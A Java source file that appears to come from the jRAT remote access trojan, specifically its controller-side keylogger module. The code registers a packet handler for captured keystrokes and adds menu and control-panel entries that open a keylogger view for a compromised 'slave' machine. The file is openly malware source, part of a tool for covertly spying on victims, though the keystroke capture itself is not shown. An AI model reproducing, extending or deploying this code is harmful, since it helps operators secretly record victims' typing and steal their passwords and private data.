package jrat.module.keys;

import jrat.api.ClientEventListener;
import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.keys.packets.PacketKey;
import jrat.module.keys.ui.PanelKeylogger;

public class KeysControllerModule extends ControllerModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 124, PacketKey.class);

        menuItems.add(new ClientMenuItem(ClientMenu.Category.QUICK_OPEN, "Keys", Resources.getIcon("keyboard"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new PanelKeylogger((Slave) slave).displayFrame();
            }
        }));

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.SYSTEM, "Keys", Resources.getIcon("keyboard"), PanelKeylogger.class));
    }
}
